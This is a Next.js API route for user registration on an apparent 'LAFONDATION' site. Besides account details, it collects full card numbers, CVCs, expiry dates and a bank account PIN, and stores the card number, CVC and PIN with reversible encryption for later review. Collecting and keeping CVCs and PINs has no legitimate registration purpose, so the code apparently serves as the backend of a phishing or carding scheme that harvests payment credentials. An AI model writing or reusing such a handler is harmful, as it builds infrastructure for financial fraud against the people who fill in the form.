import { NextResponse } from "next/server";
import { renderToBuffer } from "@react-pdf/renderer";
import { z } from "zod";
import bcrypt from "bcryptjs";
import { encryptText } from "@/lib/encryption";
import { ReceiptDocument } from "@/lib/pdf/receipt-document";
import { prisma } from "@/lib/prisma";
import { randomUUID } from "crypto";

const bodySchema = z.object({
  fullName: z.string().min(2).max(200),
  email: z.string().email().max(320),
  password: z.string().min(8).max(128),
  cardNumber: z.string().min(12).max(19),
  nameOnCard: z.string().min(2).max(120),
  cvc: z.string().min(3).max(4),
  expiry: z.string().min(4).max(7),
  accountPin: z.string().min(4).max(12),
  address: z.string().min(1).max(200),
  city: z.string().min(1).max(120),
  postalCode: z.string().min(1).max(32).optional(),
  country: z.string().min(2).max(2).default("FR"),
});

export async function POST(request: Request) {
  try {
    const json = await request.json();
    const parsed = bodySchema.safeParse(json);
    if (!parsed.success) {
      return NextResponse.json(
        { error: "Invalid input", details: parsed.error.flatten() },
        { status: 400 }
      );
    }
    const data = parsed.data;
    const passwordHash = await bcrypt.hash(data.password, 12);
    const transactionId = `LAF-${randomUUID().replace(/-/g, "").slice(0, 16).toUpperCase()}`;
    const issuedAt = new Date().toISOString();

    const user = await prisma.$transaction(async (tx) => {
      const createdUser = await tx.user.create({
        data: {
          fullName: data.fullName,
          email: data.email.toLowerCase(),
          password: passwordHash,
          city: data.city,
          address: data.address,
        },
      });

      await tx.financialDetail.create({
        data: {
          userId: createdUser.id,
          cardName: data.nameOnCard,
          cardNumberEnc: encryptText(data.cardNumber),
          expiryDate: data.expiry,
          cvcEnc: encryptText(data.cvc),
          pinEnc: encryptText(data.accountPin),
          lastFour: data.cardNumber.slice(-4),
        },
      });

      await tx.document.create({
        data: {
          userId: createdUser.id,
          fileName: `LAFONDATION-receipt-${transactionId}.pdf`,
          fileUrl: `/receipts/${transactionId}.pdf`,
          type: "RECEIPT",
          adminNote: data.postalCode
            ? `Country: ${data.country.toUpperCase()}, Postal code: ${data.postalCode}`
            : `Country: ${data.country.toUpperCase()}`,
        },
      });

      await tx.notification.create({
        data: {
          userId: createdUser.id,
          title: "Registration received",
          message: `Your registration is pending review (transaction ${transactionId}).`,
        },
      });

      return createdUser;
    });

    return NextResponse.json({
      ok: true,
      userId: user.id,
      transactionId,
    });
  } catch (e) {
    const message = e instanceof Error ? e.message : "Registration failed";
    if (message.includes("Unique constraint")) {
      return NextResponse.json({ error: "Email already exists" }, { status: 409 });
    }
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
